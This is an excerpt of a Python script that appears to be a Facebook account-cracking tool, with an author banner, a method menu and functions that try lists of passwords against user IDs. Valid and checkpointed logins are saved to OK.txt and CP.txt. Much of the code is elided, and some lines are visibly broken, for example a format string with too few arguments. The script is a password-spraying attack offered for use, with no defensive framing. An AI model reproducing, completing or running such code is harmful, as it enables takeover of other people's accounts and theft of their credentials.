...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#SAHIR_KHAN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			SAHIR_KHAN(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							SAHIR_KHAN('[•] Result CP saved to CP.txt')
							SAHIR_KHAN('\n\tCrack Processing...\n')
							SAHIR_KHAN('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					SAHIR_KHAN('\n01.) Metode b-api ')
					SAHIR_KHAN('02.) Metode mbasic ')
					SAHIR_KHAN('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			SAHIR_KHAN('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			SAHIR_KHAN(' [1] SAHIR Method 1 ')
			SAHIR_KHAN(' [2] SAHIR Method 2  [ Pro ]')
			SAHIR_KHAN(' [3] SAHIR Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				SAHIR_KHAN('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					SAHIR_KHAN('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				SAHIR_KHAN('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				SAHIR_KHAN('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				SAHIR_KHAN('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
|  \__| $$| $$  | $$| $$  | $$ _| $$_ | $$  | $$
 ...
 [*]=============================================
    Author   : SAHIR KHAN
    Facebook : https://www.facebook.com/profile.php?id=100027593852245
    Team     : ALONE
    Connect  : ONLY FACEBOOK
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+923157869500")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://www.facebook.com/profile.php?id=100027593852245")
	time.sleep(3)
	readline___Public_Xml()
